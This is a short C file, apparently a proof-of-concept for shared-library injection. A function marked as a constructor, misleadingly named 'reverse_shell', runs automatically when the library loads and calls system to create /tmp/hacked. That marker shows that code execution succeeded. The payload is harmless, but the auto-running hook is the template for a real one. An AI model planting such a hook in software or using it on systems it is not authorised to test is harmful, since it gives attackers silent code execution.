#include<stdio.h>
#include<stdlib.h>

__attribute__((constructor)) static void reverse_shell(void)
{
    system("touch /tmp/hacked");
}
